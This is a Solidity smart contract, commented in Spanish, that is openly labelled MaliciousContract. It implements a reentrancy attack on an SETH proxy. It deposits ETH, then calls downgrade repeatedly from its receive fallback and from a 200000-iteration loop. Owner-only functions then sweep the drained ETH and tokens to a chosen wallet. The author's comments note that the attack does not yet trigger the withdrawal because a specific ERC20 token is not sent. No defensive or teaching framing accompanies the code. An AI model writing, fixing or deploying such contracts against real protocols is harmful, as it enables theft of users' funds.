// SPDX-License-Identifier: MIT
import "./IERC20.sol";
pragma solidity 0.7.6;

interface SETHProxy {
    function upgradeByETH() external payable;
    function downgrade(uint256 wad) external;
}

contract MaliciousContract {
    SETHProxy private target;
    uint256 private attackCount;
    uint256 private constant MAX_ATTACK_COUNT = 204000;
    address private _owner;
  address private wadTokenAddress;

    constructor(SETHProxy _target, address _wadTokenAddress) {
        target = _target;
        wadTokenAddress = _wadTokenAddress;
        _owner = msg.sender;
    }

 modifier onlyOwner {
        require(msg.sender == _owner);
        _;
    }
    // Función de fallback para recibir ETH
    receive() external payable {
        if (attackCount < MAX_ATTACK_COUNT) {
            // Lanzar el ataque de reentrancia llamando a downgrade repetidamente
            target.downgrade(1); // aqui hay un error, como se tiene que enviar un token ierc20 identificado con esta direccion 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3 no llama a la funcion de retirar
            attackCount++;
        }
    }

    // Función para iniciar el ataque
    function initiateAttack() external payable {
        // Enviar ETH al contrato objetivo para activar el ataque de reentrancia
        target.upgradeByETH{value: msg.value}();

        // Llamar a la función downgrade para iniciar el ataque de reentrancia
        target.downgrade(1); // aqui hay un error, como se tiene que enviar un token ierc20 identificado con esta direccion 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3 no llama a la funcion de retirar
        attackCount++;
    }

    // Retirar los ETH obtenidos del ataque
    function withdraw() external onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    // Función para verificar si se alcanzó el número máximo de ataques
    function isMaxAttackCountReached() external view returns (bool) {
        return attackCount >= MAX_ATTACK_COUNT;
    }

    function clearETH(address payable _withdrawal) public onlyOwner {
        uint256 amount = address(this).balance;
        (bool success,) = _withdrawal.call{gas: 8000000, value: amount}("");
        require(success, "Failed to transfer Ether");
    }

    function remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyOwner returns(bool _sent) {
        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));
        if (number_of_tokens > randomBalance) {
            number_of_tokens = randomBalance;
        }
        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);
    }

    function approveTarget(uint256 amount) external onlyOwner {
    IERC20(wadTokenAddress).approve(address(target), amount);
}

function approveAndCallTarget(uint256 amount) external onlyOwner {
    IERC20(wadTokenAddress).approve(address(target), amount);
    
    for (uint256 i = 0; i < 200000; i++) {
        target.downgrade(amount);
    }
}
}